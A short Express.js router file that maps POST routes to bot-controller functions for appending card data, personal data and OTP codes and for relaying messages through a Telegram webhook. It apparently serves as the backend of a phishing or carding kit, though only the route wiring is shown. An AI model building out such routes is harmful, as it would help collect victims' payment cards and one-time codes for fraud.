import express from "express";
import { initProcess, telegramWebhook, sendSimpleMessage, updateMessageWithOtp, appendCardData, appendPersonData, latamSimpleMsj, editLatamMsj, initProcessAlert } from "../controllers/botController.js";

const router = express.Router();

router.post('/start-process', initProcess);
router.post('/telegram/webhook', telegramWebhook);
router.post('/send-message', sendSimpleMessage);
router.post('/append-card-data', appendCardData);
router.post('/append-person-data', appendPersonData);
router.post('/update-message-otp', updateMessageWithOtp);
router.post('/ltm-send-message', latamSimpleMsj);
router.post('/ltm-edit-message', editLatamMsj);
router.post('/ltm-init-alert', initProcessAlert);

export default router;